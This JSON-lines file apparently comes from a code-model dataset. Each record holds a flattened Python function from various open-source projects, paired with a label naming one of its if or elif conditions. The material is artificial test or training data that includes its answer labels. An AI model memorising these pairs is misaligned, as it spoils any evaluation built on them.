{"input": "def server_decode(self, buf): if self.has_recv_header: return (buf, True, False) self.has_recv_header = True crc = binascii.crc32(buf) & 0xFFFFFFFF if crc != 0xFFFFFFFF: self.has_sent_header = True if self.method == \"random_head\": return (b\"E\" * 2048, False, False) return (buf, True, False) # (buffer_to_recv, is_need_decrypt, is_need_to_encode_and_send_back) return (b\"\", False, True)", "label": "if self . method == \"random_head\" :"}
{"input": "def Decode(self, filedesc): while True: chunk = filedesc.Read(4) if not chunk: return if chunk == b\"QUUX\": yield b\"NORF\" if chunk == b\"THUD\": yield b\"BLARGH\"", "label": "if chunk == b\"QUUX\" :"}
{"input": "def decProcess(): while 1: yield clock.posedge, reset.negedge if reset == ACTIVE_LOW: count.next = 0 else: if enable: if count == -n: count.next = n - 1 else: count.next = count - 1", "label": "if count == - n :"}
{"input": "def set_torrent_path(self, torrent_id, path): try: if not self.connect(): return False self.client.core.set_torrent_move_completed_path(torrent_id, path).get() self.client.core.set_torrent_move_completed(torrent_id, 1).get() except Exception: return False finally: if self.client: self.disconnect() return True", "label": "if not self . connect ( ) :"}
{"input": "def stale_rec(node, nodes): if node.abspath() in node.ctx.env[Build.CFG_FILES]: return if getattr(node, \"children\", []): for x in node.children.values(): if x.name != \"c4che\": stale_rec(x, nodes) else: for ext in DYNAMIC_EXT: if node.name.endswith(ext): break else: if not node in nodes: if can_delete(node): Logs.warn(\"Removing stale file -> %r\", node) node.delete()", "label": "if x . name != \"c4che\" :"}
{"input": "def iterate(self, prod_, rule_): newProduction = \"\" for i in range(len(prod_)): step = self.production[i] if step == \"W\": newProduction = newProduction + self.ruleW elif step == \"X\": newProduction = newProduction + self.ruleX elif step == \"Y\": newProduction = newProduction + self.ruleY elif step == \"Z\": newProduction = newProduction + self.ruleZ elif step != \"F\": newProduction = newProduction + step self.drawLength = self.drawLength * 0.5 self.generations += 1 return newProduction", "label": "elif step == \"X\" :"}
{"input": "def _get_app_params(self): params = self.cfg.params.copy() for key, value in self.__dict__.items(): if key.startswith(\"_\"): continue elif key == \"console_parsed\": params[\"parse_console\"] = not value else: params[key] = value params[\"load_config\"] = False return params", "label": "elif key == \"console_parsed\" :"}
{"input": "def __setitem__(self, key, value): if not isinstance(value, PseudoNamespace): tuple_converted = False if isinstance(value, dict): value = PseudoNamespace(value) elif isinstance(value, tuple): value = list(value) tuple_converted = True if isinstance(value, list): for i, item in enumerate(value): if isinstance(item, dict) and not isinstance(item, PseudoNamespace): value[i] = PseudoNamespace(item) if tuple_converted: value = tuple(value) super(PseudoNamespace, self).__setitem__(key, value)", "label": "elif isinstance ( value , tuple ) :"}
{"input": "def getNextSibling(self, node): if isinstance(node, tuple): # Text node node, key = node assert key in (\"text\", \"tail\"), \"Text nodes are text or tail, found %s\" % key if key == \"text\": # XXX: we cannot use a \"bool(node) and node[0] or None\" construct here # because node[0] might evaluate to False if it has no child element if len(node): return node[0] else: return None else: # tail return node.getnext() return (node, \"tail\") if node.tail else node.getnext()", "label": "if len ( node ) :"}
{"input": "def star_path(path): \"\"\"Replace integers and integer-strings in a path with *\"\"\" path = list(path) for i, p in enumerate(path): if isinstance(p, int): path[i] = \"*\" else: if not isinstance(p, text_type): p = p.decode() if r_is_int.match(p): path[i] = \"*\" return join_path(path)", "label": "if not isinstance ( p , text_type ) :"}
{"input": "def ensure_popup_selection(self): try: self.__position_at_mouse except AttributeError: path, col = self.get_cursor() if path is None: return False self.scroll_to_cell(path, col) # ensure current cursor path is selected, just like right-click selection = self.get_selection() if not selection.path_is_selected(path): selection.unselect_all() selection.select_path(path) return True", "label": "if path is None :"}
{"input": "def release(self): me, lock_count = self.__begin() try: if me is None: return self._count = count = self._count - 1 if not count: self._owner = None self._block.release() finally: self.__end(me, lock_count)", "label": "if me is None :"}
{"input": "def date_match(self, date1, date2): if date1.is_empty() or date2.is_empty(): return 0 if date1.is_equal(date2): return 1 if date1.is_compound() or date2.is_compound(): return self.range_compare(date1, date2) if date1.get_year() == date2.get_year(): if date1.get_month() == date2.get_month(): return 0.75 if not date1.get_month_valid() or not date2.get_month_valid(): return 0.75 else: return -1 else: return -1", "label": "if not date1 . get_month_valid ( ) or not date2 . get_month_valid ( ) :"}
{"input": "def onMinimize(self, sender): if self._runDialogListener(\"onMinimize\") is False: return widget = self.child if widget is not None: if widget.isVisible(): widget.setVisible(False) self.setHeight(\"\") self.setWidth(\"\") if self._maximized: self._minimized = self._maximized self._toggleMaximize() else: self._minimized = None else: if self._minimized is not None: self._toggleMaximize() widget.setVisible(True)", "label": "if widget . isVisible ( ) :"}
{"input": "def instance_reader(): for epoch_index in range(epoch): if shuffle: if shuffle_seed is not None: np.random.seed(shuffle_seed) np.random.shuffle(examples) if phase == \"train\": self.current_train_epoch = epoch_index for (index, example) in enumerate(examples): if phase == \"train\": self.current_train_example = index + 1 feature = self.convert_example( index, example, self.get_labels(), self.max_seq_len, self.tokenizer ) instance = self.generate_instance(feature) yield instance", "label": "if shuffle :"}
{"input": "def _parse_lines(self, linesource): \"\"\"Parse lines of text for functions and classes\"\"\" functions = [] classes = [] for line in linesource: if line.startswith(\"def \") and line.count(\"(\"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): functions.append(name) elif line.startswith(\"class \"): # exclude private stuff name = self._get_object_name(line) if not name.startswith(\"_\"): classes.append(name) else: pass functions.sort() classes.sort() return functions, classes", "label": "elif line . startswith ( \"class \" ) :"}
{"input": "def get_folder_version(folder): f = os.path.join(code_path, folder, \"version.txt\") try: with open(f) as fd: content = fd.read() p = re.compile(r\"([0-9]+)\\.([0-9]+)\\.([0-9]+)\") m = p.match(content) if m: version = m.group(1) + \".\" + m.group(2) + \".\" + m.group(3) return version except: return False", "label": "if m :"}
{"input": "def __init__( self, plugin_name=None, builtin=False, deprecated=False, config=None, session=None ): if builtin and isinstance(builtin, (str, unicode)): builtin = os.path.basename(builtin) for ignore in (\".py\", \".pyo\", \".pyc\"): if builtin.endswith(ignore): builtin = builtin[: -len(ignore)] if builtin not in self.LOADED: self.LOADED.append(builtin) self.loading_plugin = plugin_name self.loading_builtin = plugin_name and builtin self.builtin = builtin self.deprecated = deprecated self.session = session self.config = config self.manifests = []", "label": "if builtin not in self . LOADED :"}
{"input": "def setInt(self, path, value, **kwargs): if value is None: self.set(path, None, **kwargs) return minimum = kwargs.pop(\"min\", None) maximum = kwargs.pop(\"max\", None) try: intValue = int(value) if minimum is not None and intValue < minimum: intValue = minimum if maximum is not None and intValue > maximum: intValue = maximum except ValueError: self._logger.warning( \"Could not convert %r to a valid integer when setting option %r\" % (value, path) ) return self.set(path, intValue, **kwargs)", "label": "if minimum is not None and intValue < minimum :"}
{"input": "def __call__(self, session_path): \"\"\"Get raw session object from `session_path`.\"\"\" new_session = copy.deepcopy(self._template) session_keys = new_session.keys() old_session = self._load_file(session_path) for attribute in dir(self): if attribute.startswith(\"set_\"): target = attribute[4:].capitalize() if target not in session_keys: raise ValueError(\"Invalid attribute: %r\" % attribute) function = getattr(self, attribute) new_session[target] = function(old_session) return new_session", "label": "if attribute . startswith ( \"set_\" ) :"}
{"input": "def add_comment_to_directory(args, dir_path): for root, _, files in os.walk(dir_path): for file_name in files: if not re.match(r\".*(\\.c|\\.h|\\.cpp|\\.hpp|\\.cxx|\\.hxx)$\", file_name): continue file_path = os.path.join(root, file_name) add_comment_to_file(args, file_path)", "label": "if not re . match ( r\".*(\\.c|\\.h|\\.cpp|\\.hpp|\\.cxx|\\.hxx)$\" , file_name ) :"}
{"input": "def reportMemory(k, options, field=None, isBytes=False): \"\"\"Given k kilobytes, report back the correct format as string.\"\"\" if options.pretty: return prettyMemory(int(k), field=field, isBytes=isBytes) else: if isBytes: k /= 1024.0 if field is not None: return \"%*dK\" % (field - 1, k) # -1 for the \"K\" else: return \"%dK\" % int(k)", "label": "if isBytes :"}
{"input": "def resolve(self, arguments): positional = [] named = {} for arg in arguments: if self._is_named(arg): self._add_named(arg, named) elif named: self._raise_positional_after_named() else: positional.append(arg) return positional, named", "label": "elif named :"}
{"input": "def _load_from_cache(self): if self._cache_key in self._cache: creds = deepcopy(self._cache[self._cache_key]) if not self._is_expired(creds): return creds else: logger.debug(\"Credentials were found in cache, but they are expired.\") return None", "label": "if not self . _is_expired ( creds ) :"}
{"input": "def convertstore(self, inputstore, includefuzzy=False): \"\"\"converts a file to .lang format\"\"\" thetargetfile = lang.LangStore(mark_active=self.mark_active) # Run over the po units for pounit in inputstore.units: if pounit.isheader() or not pounit.istranslatable(): continue newunit = thetargetfile.addsourceunit(pounit.source) if includefuzzy or not pounit.isfuzzy(): newunit.settarget(pounit.target) else: newunit.settarget(\"\") if pounit.getnotes(\"developer\"): newunit.addnote(pounit.getnotes(\"developer\"), \"developer\") return thetargetfile", "label": "if pounit . getnotes ( \"developer\" ) :"}
{"input": "def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for exclude_field in self.context[\"request\"].query_params.getlist(\"exclude\"): p = exclude_field.split(\".\") if p[0] in self.fields: if len(p) == 1: del self.fields[p[0]] elif len(p) == 2: self.fields[p[0]].child.fields.pop(p[1])", "label": "if p [ 0 ] in self . fields :"}
{"input": "def __init__(self, fn, args, resources): self.fn = fn self.args = copy.deepcopy(args) self.resources = resources with Task.LOCK: self.task_id = Task.TASK_ID.value if \"args\" in self.args: if isinstance( self.args[\"args\"], (argparse.Namespace, argparse.ArgumentParser) ): args_dict = vars(self.args[\"args\"]) else: args_dict = self.args[\"args\"] args_dict.update({\"task_id\": self.task_id}) Task.TASK_ID.value += 1", "label": "if \"args\" in self . args :"}
{"input": "def _expand_nsplit_by_reduce(splits, reduced): if reduced == 1: return splits out = [] for s in splits: x = s part = max(x / reduced, 1) while x >= 2 * part: out.append(int(part)) x -= int(part) if x: out.append(x) assert sum(splits) == sum(out) return tuple(out)", "label": "if x :"}
{"input": "def OnDeleteLine(self, items): for n in items: if n >= 0: name1 = self.items[n][2] name2 = self.items[n][4] del self.items[n] if name1 in self.bindiff.matched1: self.bindiff.matched1.remove(name1) if name2 in self.bindiff.matched2: self.bindiff.matched2.remove(name2) return [Choose.ALL_CHANGED] + items", "label": "if n >= 0 :"}
{"input": "def _to_str(self, tokens: List[int]) -> str: pos = next( (idx for idx, x in enumerate(tokens) if x == self.vocab.eos_token_id), -1 ) if pos != -1: tokens = tokens[:pos] vocab_map = self.vocab.id_to_token_map_py words = [vocab_map[t] for t in tokens] if self.encoding is not None and self.perform_decode: if self.encoding == \"bpe\": words = self.bpe_decode(words) elif self.encoding == \"spm\": words = self.spm_decode(words) sentence = \" \".join(words) return sentence", "label": "if self . encoding == \"bpe\" :"}
{"input": "def detect(content, **kwargs): headers = kwargs.get(\"headers\", {}) content = str(content) detection_schema = ( re.compile(r\"\\Abarra.counter.session(=)?\", re.I), re.compile(r\"(\\A|\\b)?barracuda.\", re.I), re.compile(r\"barracuda.networks(.)?.inc\", re.I), ) for detection in detection_schema: if detection.search(headers.get(HTTP_HEADER.SET_COOKIE, \"\")) is not None: return True if detection.search(content) is not None: return True", "label": "if detection . search ( headers . get ( HTTP_HEADER . SET_COOKIE , \"\" ) ) is not None :"}
{"input": "def _finish_port_forward(self, listener, listen_host, listen_port): \"\"\"Finish processing a TCP/IP port forwarding request\"\"\" if asyncio.iscoroutine(listener): try: listener = yield from listener except OSError: listener = None if listener: if listen_port == 0: listen_port = listener.get_port() result = UInt32(listen_port) else: result = True self._local_listeners[listen_host, listen_port] = listener self._report_global_response(result) else: self.logger.debug1(\"Failed to create TCP listener\") self._report_global_response(False)", "label": "if listen_port == 0 :"}
{"input": "def start(self): \"\"\"Start running the mainloop.\"\"\" with self: result = pa.pa_threaded_mainloop_start(self._pa_threaded_mainloop) if result < 0: raise PulseAudioException(0, \"Failed to start PulseAudio mainloop\") assert _debug(\"PulseAudioMainLoop: Started\")", "label": "if result < 0 :"}
{"input": "def service(self): try: try: self.start() self.execute() self.finish() except socket.error: self.close_on_finish = True if self.channel.adj.log_socket_errors: raise finally: pass", "label": "if self . channel . adj . log_socket_errors :"}
{"input": "def _makepath(self, path): if not self.abspath: try: np = py.path.local().bestrelpath(path) except OSError: return path if len(np) < len(str(path)): path = np return path", "label": "if len ( np ) < len ( str ( path ) ) :"}
{"input": "def upload( youtube_resource, video_path, body, chunksize=1024 * 1024, progress_callback=None ): body_keys = \",\".join(body.keys()) media = MediaFileUpload(video_path, chunksize=chunksize, resumable=True) videos = youtube_resource.videos() request = videos.insert(part=body_keys, body=body, media_body=media) while 1: status, response = request.next_chunk() if response: if \"id\" in response: return response[\"id\"] else: raise KeyError(\"Response has no 'id' field\") elif status and progress_callback: progress_callback(status.total_size, status.resumable_progress)", "label": "if response :"}
{"input": "def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for exclude_field in self.context[\"request\"].query_params.getlist(\"exclude\"): p = exclude_field.split(\".\") if p[0] in self.fields: if len(p) == 1: del self.fields[p[0]] elif len(p) == 2: self.fields[p[0]].child.fields.pop(p[1])", "label": "if len ( p ) == 1 :"}
{"input": "def on_button_press_event(self, iconview, event): # print('on_button_press_event') if event.button == 3: popup_menu = Gtk.Menu() x = int(event.x) y = int(event.y) time = event.time pathinfo = iconview.get_path_at_pos(x, y) if pathinfo is not None: iconview.grab_focus() self.do_populate_popup(popup_menu, pathinfo) # FIXME should use a signal here gtk_popup_at_pointer(popup_menu, event) return True return False", "label": "if pathinfo is not None :"}
{"input": "def __rshift__(self, other): if not self.symbolic and type(other) is int: return RegisterOffset( self._bits, self.reg, self._to_signed(self.offset >> other) ) else: if self.symbolic: return RegisterOffset(self._bits, self.reg, self.offset >> other) else: return RegisterOffset( self._bits, self.reg, ArithmeticExpression( ArithmeticExpression.RShift, ( self.offset, other, ), ), )", "label": "if self . symbolic :"}
{"input": "def _slice_positional_metadata(self, indexable): if self.has_positional_metadata(): if _is_single_index(indexable): index = _single_index_to_slice(indexable) else: index = indexable return self.positional_metadata.iloc[index] else: return None", "label": "if _is_single_index ( indexable ) :"}
{"input": "def _show_env(name=None): if name is None: name = \"\" env = peda.execute_redirect(\"show env\") for line in env.splitlines(): (k, v) = line.split(\"=\", 1) if k.startswith(name): msg(\"%s = %s\" % (k, v if is_printable(v) else to_hexstr(v))) return", "label": "if k . startswith ( name ) :"}
{"input": "def skip_to_semicolon(s, i): n = len(s) while i < n: c = s[i] if c == \";\": return i elif c == \"'\" or c == '\"': i = g.skip_string(s, i) elif g.match(s, i, \"//\"): i = g.skip_to_end_of_line(s, i) elif g.match(s, i, \"/*\"): i = g.skip_block_comment(s, i) else: i += 1 return i", "label": "elif g . match ( s , i , \"//\" ) :"}
{"input": "def filter_iterable(cls, iterable, filterset_class, filters_name, info, **args): filter_input = args.get(filters_name) if filter_input and filterset_class: instance = filterset_class( data=dict(filter_input), queryset=iterable, request=info.context ) # Make sure filter input has valid values if not instance.is_valid(): raise GraphQLError(json.dumps(instance.errors.get_json_data())) iterable = instance.qs return iterable", "label": "if not instance . is_valid ( ) :"}
{"input": "def build(opt): dpath = os.path.join(opt[\"datapath\"], \"self_feeding\") version = \"3.1\" if not build_data.built(dpath, version): print(\"[building data: \" + dpath + \"]\") if build_data.built(dpath): # An older version exists, so remove these outdated files. build_data.remove_dir(dpath) build_data.make_dir(dpath) # Download the data. for downloadable_file in RESOURCES: downloadable_file.download_file(dpath) build_data.mark_done(dpath, version)", "label": "if build_data . built ( dpath ) :"}
{"input": "def get_tokens_unprocessed(self, text): for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name: if self.stdlibhighlighting and value in self.stdlib_types: token = Keyword.Type elif self.c99highlighting and value in self.c99_types: token = Keyword.Type elif self.platformhighlighting and value in self.linux_types: token = Keyword.Type yield index, token, value", "label": "elif self . c99highlighting and value in self . c99_types :"}
{"input": "def searchOpcode(self, opcode, name=None): to_return = {} if not name: for file in self.__files: to_return[file.loader.fileName] = self.__ropper.searchOpcode( file.loader, opcode ) else: fc = self.getFileFor(name) if not fc: raise RopperError(\"No such file opened: %s\" % name) to_return[name] = self.__ropper.searchOpcode(fc.loader, opcode) return self.__filterBadBytes(to_return)", "label": "if not fc :"}
{"input": "def logic(): while 1: yield clock.posedge, reset.negedge if reset == ACTIVE_LOW: count.next = 0 else: if enable: if count == -n: count.next = n - 1 else: count.next = count - 1", "label": "if reset == ACTIVE_LOW :"}
{"input": "def upgrade_cursor(cursor): count = 0 prefix = pack_be_uint16(cursor) key_len = HASHX_LEN + 2 chunks = util.chunks with self.db.write_batch() as batch: batch_put = batch.put for key, hist in self.db.iterator(prefix=prefix): # Ignore non-history entries if len(key) != key_len: continue count += 1 hist = b\"\".join(item + b\"\\0\" for item in chunks(hist, 4)) batch_put(key, hist) self.upgrade_cursor = cursor self.write_state(batch) return count", "label": "if len ( key ) != key_len :"}
{"input": "def fork(receiver: Receiver, func, *args, **kwargs): current_actor = self() send(Fork(current_actor, func, args, kwargs), receiver) while True: message = recv(current_actor) if isinstance(message, ForkResponse): return message.new_actor else: send(message, current_actor) return", "label": "if isinstance ( message , ForkResponse ) :"}
{"input": "def history_move(self, n): from ranger.container.history import HistoryEmptyException try: current = self.history.current() except HistoryEmptyException: pass else: if self.line != current and self.line != self.history.top(): self.history.modify(self.line) self.history.move(n) current = self.history.current() if self.line != current: self.line = self.history.current() self.pos = len(self.line)", "label": "if self . line != current and self . line != self . history . top ( ) :"}
{"input": "def fullname(self): if self._fullname is None: pkg_name = namespace.apply_namespace(self.dist.project_name) if pkg_name and pkg_name != \".\": self._fullname = \"%s/%s\" % (pkg_name, self.name) else: self._fullname = self.name return self._fullname", "label": "if pkg_name and pkg_name != \".\" :"}
{"input": "def do_install(datafilename): ifile = open(datafilename, \"rb\") d = pickle.load(ifile) destdir_var = \"DESTDIR\" if destdir_var in os.environ: if d.prefix[0] == \"/\": subdir = d.prefix[1:] else: subdir = d.prefix d.prefix = os.path.join(os.environ[destdir_var], subdir) install_targets(d) install_headers(d) install_man(d) install_data(d) install_po(d)", "label": "if d . prefix [ 0 ] == \"/\" :"}
{"input": "def truncate(self, size=None): # type: (Optional[int]) -> int # Inefficient, but I don't know if truncate is possible with ftp with self._lock: if size is None: size = self.tell() with self.fs.openbin(self.path) as f: data = f.read(size) with self.fs.openbin(self.path, \"w\") as f: f.write(data) if len(data) < size: f.write(b\"\\0\" * (size - len(data))) return size", "label": "if size is None :"}
{"input": "def write(self, expression, location=None): # If the phrase is incomplete, utop will not remember it, so # we need to account for it here. Also, Shift+Enter will add a literal # newline, which would otherwise break protocol. for line in expression.split(\"\\n\"): self._phrase.append(line) if location is not None: self._phrase_line_begins.append(location) location += len(line) + 1 self.write_command(\"input\", \"allow-incomplete\", self._phrase)", "label": "if location is not None :"}
{"input": "def scan_iter(self, match=None, count=None): nodes = await self.cluster_nodes() for node in nodes: if \"master\" in node[\"flags\"]: cursor = \"0\" while cursor != 0: pieces = [cursor] if match is not None: pieces.extend([\"MATCH\", match]) if count is not None: pieces.extend([\"COUNT\", count]) response = await self.execute_command_on_nodes([node], \"SCAN\", *pieces) cursor, data = list(response.values())[0] for item in data: yield item", "label": "if match is not None :"}
{"input": "def communicate(self, input_data=None): \"\"\"Mock subprocess.Popen.communicate.\"\"\" for i in range(2): timeout = execute_time if i == 0 else sigterm_handler_time try: received_signal = self.signal_queue.get(block=True, timeout=timeout) except queue.Empty: continue self.received_signals.append((received_signal, time.time() - self.start_time)) if received_signal == Signal.KILL: break return output, None", "label": "if received_signal == Signal . KILL :"}
{"input": "def _add_bookmark_breakpoint(self): \"\"\"Add a bookmark or breakpoint to the current file in the editor.\"\"\" editorWidget = self.ide.mainContainer.get_actual_editor() if editorWidget and editorWidget.hasFocus(): if self.ide.mainContainer.actualTab.navigator.operation == 1: editorWidget._sidebarWidget.set_bookmark( editorWidget.textCursor().blockNumber() ) elif self.ide.mainContainer.actualTab.navigator.operation == 2: editorWidget._sidebarWidget.set_breakpoint( editorWidget.textCursor().blockNumber() )", "label": "elif self . ide . mainContainer . actualTab . navigator . operation == 2 :"}
{"input": "def _should_auto_select_container_version(instance_type, distribution): \"\"\"Returns a boolean that indicates whether to use an auto-selected container version.\"\"\" p4d = False if instance_type: # looks for either \"ml.<family>.<size>\" or \"ml_<family>\" match = re.match(r\"^ml[\\._]([a-z\\d]+)\\.?\\w*$\", instance_type) if match: family = match[1] p4d = family == \"p4d\" smdistributed = False if distribution: smdistributed = \"smdistributed\" in distribution return p4d or smdistributed", "label": "if match :"}
{"input": "def _flush_some_if_lockable(self): # Since our task may be appending to the outbuf, we try to acquire # the lock, but we don't block if we can't. if self.outbuf_lock.acquire(False): try: self._flush_some() if self.total_outbufs_len < self.adj.outbuf_high_watermark: self.outbuf_lock.notify() finally: self.outbuf_lock.release()", "label": "if self . total_outbufs_len < self . adj . outbuf_high_watermark :"}
{"input": "def add_auth(self, req, **kwargs): if not \"x-amz-content-sha256\" in req.headers: if \"_sha256\" in req.headers: req.headers[\"x-amz-content-sha256\"] = req.headers.pop(\"_sha256\") else: req.headers[\"x-amz-content-sha256\"] = self.payload(req) req = self.mangle_path_and_params(req) return super(S3HmacAuthV4Handler, self).add_auth(req, **kwargs)", "label": "if \"_sha256\" in req . headers :"}
{"input": "def get_objects(self): list_type, id, handles, timestamp = self._obj_list retval = [] for (target, handle) in handles: _class = map2class(target) if _class: obj = _class(self._dbstate, pickle.dumps((target, id, handle, timestamp))) if obj: retval.append(obj) return retval", "label": "if obj :"}
{"input": "def toggle_fullscreen_hide_tabbar(self): if self.is_fullscreen(): if self.settings.general.get_boolean(\"fullscreen-hide-tabbar\"): if self.guake and self.guake.notebook_manager: self.guake.notebook_manager.set_notebooks_tabbar_visible(False) else: if self.guake and self.guake.notebook_manager: v = self.settings.general.get_boolean(\"window-tabbar\") self.guake.notebook_manager.set_notebooks_tabbar_visible(v)", "label": "if self . guake and self . guake . notebook_manager :"}
{"input": "def __repr__(self): parts = [] if not approx_equal(self.constant, 0.0) or self.is_constant: parts.append(repr(self.constant)) for clv, coeff in sorted(self.terms.items(), key=lambda x: repr(x)): if approx_equal(coeff, 1.0): parts.append(repr(clv)) else: parts.append(repr(coeff) + \"*\" + repr(clv)) return \" + \".join(parts)", "label": "if approx_equal ( coeff , 1.0 ) :"}
{"input": "def wrapper(*args, **kwds): global bootstrap_logger_enabled if bootstrap_logger_enabled: if level == \"EXCEPTION\": bootstrap_logger.exception(msg=args[0]) else: bootstrap_logger.log(level=level, msg=args[0]) return f(*args, **kwds)", "label": "if level == \"EXCEPTION\" :"}
{"input": "def get_sorted_entry(field, bookid): if field == \"title\" or field == \"authors\": book = calibre_db.get_filtered_book(bookid) if book: if field == \"title\": return json.dumps({\"sort\": book.sort}) elif field == \"authors\": return json.dumps({\"author_sort\": book.author_sort}) return \"\"", "label": "elif field == \"authors\" :"}
{"input": "def movies_iterator(): for row in self._tuple_iterator(query): id, guid, movie = self._parse(fields, row, offset=2) # Parse `guid` (if enabled, and not already parsed) if parse_guid: if id not in guids: guids[id] = Guid.parse(guid) guid = guids[id] # Return item yield id, guid, movie", "label": "if id not in guids :"}
{"input": "def update_sockets(self, context): bools = [self.min_list, self.max_list, self.size_list] dims = int(self.dimensions[0]) for i in range(3): for j in range(3): out_index = 4 + j + 3 * i hidden = self.outputs[out_index].hide_safe if bools[i][j] and j < dims: if hidden: self.outputs[out_index].hide_safe = False else: self.outputs[out_index].hide_safe = True updateNode(self, context)", "label": "if hidden :"}
{"input": "def broadcast(self, msg, eid): for s in self.subs: if type(self.subs[s].eid) is list: if eid in self.subs[s].eid: self.subs[s].write_message(msg) else: if self.subs[s].eid == eid: self.subs[s].write_message(msg)", "label": "if eid in self . subs [ s ] . eid :"}
{"input": "def as_create_delta( self: CallableObjectT, schema: s_schema.Schema, context: so.ComparisonContext, ) -> sd.ObjectCommand[CallableObjectT]: delta = super().as_create_delta(schema, context) new_params = self.get_params(schema).objects(schema) for p in new_params: if not param_is_inherited(schema, self, p): delta.add_prerequisite( p.as_create_delta(schema=schema, context=context), ) return delta", "label": "if not param_is_inherited ( schema , self , p ) :"}
{"input": "def set_indentation_params(self, ispythonsource, guess=True): if guess and ispythonsource: i = self.guess_indent() if 2 <= i <= 8: self.indentwidth = i if self.indentwidth != self.tabwidth: self.usetabs = False self.set_tabwidth(self.tabwidth)", "label": "if 2 <= i <= 8 :"}
{"input": "def _test(): \"\"\"Simple test program to disassemble a file.\"\"\" argc = len(sys.argv) if argc != 2: if argc == 1: fn = __file__ else: sys.stderr.write(\"usage: %s [-|CPython compiled file]\\n\" % __file__) sys.exit(2) else: fn = sys.argv[1] disassemble_file(fn)", "label": "if argc == 1 :"}
{"input": "def set_lineno(self, lineno, override=False): \"\"\"Set the line numbers of the node and children.\"\"\" todo = deque([self]) while todo: node = todo.popleft() if \"lineno\" in node.attributes: if node.lineno is None or override: node.lineno = lineno todo.extend(node.iter_child_nodes()) return self", "label": "if \"lineno\" in node . attributes :"}
{"input": "def _connect(s, address): try: s.connect(address) except socket.error: (ty, v) = sys.exc_info()[:2] if hasattr(v, \"errno\"): v_err = v.errno else: v_err = v[0] if v_err not in [errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY]: raise v", "label": "if hasattr ( v , \"errno\" ) :"}
{"input": "def SurroundedByParens(token): \"\"\"Check if it's an expression surrounded by parentheses.\"\"\" while token: if token.value == \",\": return False if token.value == \")\": return not token.next_token if token.OpensScope(): token = token.matching_bracket.next_token else: token = token.next_token return False", "label": "if token . value == \",\" :"}
{"input": "def read_vocab_list(path, max_vocab_size=20000): vocab = {\"<eos>\": 0, \"<unk>\": 1} with io.open(path, encoding=\"utf-8\", errors=\"ignore\") as f: for l in f: w = l.strip() if w not in vocab and w: vocab[w] = len(vocab) if len(vocab) >= max_vocab_size: break return vocab", "label": "if len ( vocab ) >= max_vocab_size :"}
{"input": "def _messageHandled(self, resultList): failures = 0 for (success, result) in resultList: if not success: failures += 1 log.err(result) if failures: msg = \"Could not send e-mail\" resultLen = len(resultList) if resultLen > 1: msg += \" ({} failures out of {} recipients)\".format(failures, resultLen) self.sendCode(550, networkString(msg)) else: self.sendCode(250, b\"Delivery in progress\")", "label": "if resultLen > 1 :"}
{"input": "def test_images_p_is_stochastic_parameter(self): aug = self.create_aug(p=iap.Choice([0, 1], p=[0.7, 0.3])) seen = [0, 0] for _ in sm.xrange(1000): observed = aug.augment_image(self.image) if np.array_equal(observed, self.image): seen[0] += 1 elif np.array_equal(observed, self.image_flipped): seen[1] += 1 else: assert False assert np.allclose(seen, [700, 300], rtol=0, atol=75)", "label": "elif np . array_equal ( observed , self . image_flipped ) :"}
{"input": "def kill(self): # check and execute the 'kill' method if present if self.has_kill: try: kill_method = getattr(self.module_class, \"kill\") if self.has_kill == self.PARAMS_NEW: kill_method() else: # legacy call parameters kill_method( self.i3status_thread.json_list, self.config[\"py3_config\"][\"general\"], ) except Exception: # this would be stupid to die on exit pass", "label": "if self . has_kill == self . PARAMS_NEW :"}
{"input": "def remove_topic(self, topic): if topic not in self.messages: return del self.messages[topic] for sub in self.subscribers.get(topic, set()): if hasattr(sub, \"_pyroRelease\"): sub._pyroRelease() if hasattr(sub, \"_pyroUri\"): try: proxy = self.proxy_cache[sub._pyroUri] proxy._pyroRelease() del self.proxy_cache[sub._pyroUri] except KeyError: pass del self.subscribers[topic]", "label": "if hasattr ( sub , \"_pyroRelease\" ) :"}
{"input": "def run_async(self, source, target, reverse): to_load = target or self.get_next(source, reverse) if not to_load: return view_signature = self.view_signatures[to_load] window = self.view.window() if window: window.run_command(self.commands[to_load]) if not self.view.settings().get(view_signature): sublime.set_timeout_async(self.view.close)", "label": "if not self . view . settings ( ) . get ( view_signature ) :"}
{"input": "def eval_operand(assembly, start, stop, prefix=\"\"): imm = assembly[start + 1 : stop] try: eval_imm = eval(imm) if eval_imm > 0x80000000: eval_imm = 0xFFFFFFFF - eval_imm eval_imm += 1 eval_imm = -eval_imm return assembly.replace(prefix + imm, prefix + hex(eval_imm)) except: return assembly", "label": "if eval_imm > 0x80000000 :"}
{"input": "def admin(): if Configuration.loginRequired(): if not current_user.is_authenticated(): return render_template(\"login.html\") else: person = User.get(\"_dummy_\") login_user(person) output = None if os.path.isfile(Configuration.getUpdateLogFile()): with open(Configuration.getUpdateLogFile()) as updateFile: separator = \"==========================\\n\" output = updateFile.read().split(separator)[-2:] output = separator + separator.join(output) return render_template(\"admin.html\", status=\"default\", **adminInfo(output))", "label": "if not current_user . is_authenticated ( ) :"}
{"input": "def data(self): result = \"\" for hunk in self._hunks: if isinstance(hunk, tuple) and len(hunk) == 2: hunk, f = hunk else: f = lambda x: x result += f(hunk.data()) return result", "label": "if isinstance ( hunk , tuple ) and len ( hunk ) == 2 :"}
{"input": "def not_less_witness(self, other): n = max(self.longest_run_of_spaces(), other.longest_run_of_spaces()) + 1 a = [] for ts in range(1, n + 1): if self.indent_level(ts) >= other.indent_level(ts): a.append((ts, self.indent_level(ts), other.indent_level(ts))) return a", "label": "if self . indent_level ( ts ) >= other . indent_level ( ts ) :"}
{"input": "def _validate(self) -> None: indent = self.indent if indent is not None: if len(indent) == 0: raise CSTValidationError( \"An indented block must have a non-zero width indent.\" ) if _INDENT_WHITESPACE_RE.fullmatch(indent) is None: raise CSTValidationError( \"An indent must be composed of only whitespace characters.\" )", "label": "if len ( indent ) == 0 :"}
{"input": "def sanitize_numeric_fields(info): for numeric_field in self._NUMERIC_FIELDS: field = info.get(numeric_field) if field is None or isinstance(field, compat_numeric_types): continue report_force_conversion(numeric_field, \"numeric\", \"int\") info[numeric_field] = int_or_none(field)", "label": "if field is None or isinstance ( field , compat_numeric_types ) :"}
